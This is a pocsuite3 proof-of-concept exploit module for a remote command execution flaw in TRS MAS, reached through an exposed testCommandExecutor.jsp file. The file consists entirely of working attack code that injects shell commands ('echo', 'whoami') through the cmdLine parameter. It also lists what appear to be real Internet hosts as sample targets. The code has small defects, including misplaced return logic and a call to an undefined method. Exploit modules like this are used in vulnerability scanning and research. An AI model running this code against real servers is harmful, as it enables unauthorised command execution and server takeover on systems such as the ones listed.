#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
import json

class TestPOC(POCBase):
	vulID = '''DSO-06017'''
	cweID = "CWE-78"
	appDevLanguage = ""
	appCategory = ""
	cveID = ''''''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = '''1.0'''
	author = ''''''
	vulDate = '''2022-04-30'''
	createDate = '''2022-05-06'''
	updateDate = '''2022-06-20'''
	name = '''TRS MAS testCommandExecutor.jsp 存在远程命令执行漏洞'''
	desc = '''拓尔思信息技术股份有限公司 MAS testCommandExecutor.jsp测试文件存在远程命令执行漏洞，当网站运维者未删除测试文件时，攻击者通过漏洞可以获取服务器权限.'''
	solution = '''<p>请关注厂商并更新至安全版本</p>
	<p>厂商链接:http://www.trs.com.cn/</p>'''
	severity = '''high'''
	vulType = '''cmd-exec'''
	taskType = '''app-vul'''
	proto = ['http']
	scanFlag = 2
	tag = ['important']
	references = ['''''']
	appName = '''TRS MAS'''
	appVersion = '''all'''
	appPowerLink = ''''''
	samples = ['''http://122.137.242.26:8085''','''http://82.156.13.175:8080/''','''http://124.70.108.46:8080/''','''http://27.17.61.122:8090/''','''http://mas.cnipr.com/''','''http://180.76.136.5/''']
	install_requires = ['''''']

	def _verify(self):
		result = {}
		vul_url = self.url + "/mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=echo TestbyZsf&workDir=&pathEnv=&libPathEnv="
		headers = {
			"Content-Type": "application/x-www-form-urlencoded",
		}
		resp = requests.get(vul_url, headers=headers, allow_redirects=False, verify=False, timeout=10)
		if '<title>测试命令行进程执行</title>' in resp.text and 'TRSMAS'  in resp.text and 'TestbyZsf' in resp.text and resp.status_code == 200:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = vul_url
		return self.parse_output(result)

	
	def _attack(self):
		result = {}
		target = self.url +  "/mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=whoami&workDir=&pathEnv=&libPathEnv="
		headers = {
			"Content-Type": "application/x-www-form-urlencoded",
		}
		try:
			resp = requests.get(url=target, headers=headers, timeout=5)
			if resp.status_code == 200:
				result['VerifyInfo'] = {}
				result['VerifyInfo']['URL'] = target
		except Exception as ex:
			pass
			return self.parse_verify(result)

	def parse_verify(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('target is not vulnerable')
		return output

register_poc(TestPOC)


